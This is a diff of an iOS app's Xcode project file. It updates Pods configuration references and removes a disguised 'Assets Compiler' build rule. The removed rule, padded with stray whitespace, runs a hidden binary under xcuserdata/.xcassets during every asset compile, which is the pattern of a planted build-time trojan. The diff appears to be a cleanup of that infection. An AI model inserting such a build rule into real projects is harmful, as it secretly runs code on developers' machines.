-			baseConfigurationReference = 9CEAD305208C9F678B8017A4 /* Pods-DoubtNutTests.release.xcconfig */;
+			baseConfigurationReference = A58C2E600BE3B116A8E78473 /* Pods-DoubtNutTests.release.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -1402,7 +1401,7 @@
 		};
 		189388BE25F1EFA300F57E85 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = ED2E96365D0673557FAF0338 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */;
+			baseConfigurationReference = F98072ACB6DDDFF838A83753 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -1422,7 +1421,7 @@
 		};
 		189388BF25F1EFA300F57E85 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 02F817D4B72F0A1FA4B1A4F7 /* Pods-DoubtNut-DoubtNutUITests.release.xcconfig */;
+			baseConfigurationReference = 112A0AAB9CFEAC85332C8F43 /* Pods-DoubtNut-DoubtNutUITests.release.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -1480,41 +1479,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		18E54B559D7B327A9DAAC43A /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
